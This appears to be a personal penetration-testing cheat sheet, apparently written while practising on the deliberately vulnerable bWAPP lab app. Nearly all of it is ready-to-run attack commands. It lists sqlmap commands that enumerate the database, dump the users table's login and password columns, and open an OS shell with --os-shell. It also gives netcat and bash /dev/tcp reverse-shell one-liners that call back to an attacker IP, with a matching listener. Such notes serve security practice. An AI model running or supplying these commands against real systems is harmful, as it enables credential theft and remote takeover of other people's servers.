# Infosec
My InfoSec Cheat sheet and stuff


------
scan local network
-----

arp-scan --local

------

sqlmap 

------

OK so we've got SQLMap, but how do we release it upon our target?
INJECTION TESTING
Gathering commonly needed elements
Cookies
POST data (if data not in URL)
sqlmap --url="http://bee-box/bWAPP/slqi_1.php?title=iron" --dbs
--dbs info is found using the -hh option of sqlmap
Add --cookie="security_level=0;PHPSESSID=xxxxxx"
the bwapp app requires it
If POST then add --data="title=iron&action=search"
Input data and parameters are usually found in the request BODY
So we have a good injection point and even enumerated the name of the database,
but how do we get at the data?
Enumerate the Table names
sqlmap --url="http://bee-box/bWAPP/sqli_1.php?title=iron" -D bWAPP --tables
Enumerate Columns
sqlmap --url="http://bee-box/bWAPP/sqli_1.php?title=iron" -D bWAPP -T users --
columns
Dump database data from table 'users' from columns 'login' and 'password'
sqlmap --url="http://bee-box/bWAPP/sqli_1.php?title=iron" -D bWAPP -T users -C
login,password --dump
Any other useful tricks?
How about COMMAND EXECUTION?
sqlmap --url="http://bee-box/bWAPP/sqli_1.php?title=iron" -D bWAPP --os-shell


----------

nc shell

----------

nc -nvlp 9999 (attacker)

nc -nv -e /bin/bash IP PORT  OR  bash -c "bash -i >& /dev/tcp/10.10.15.94/443 0>&1"

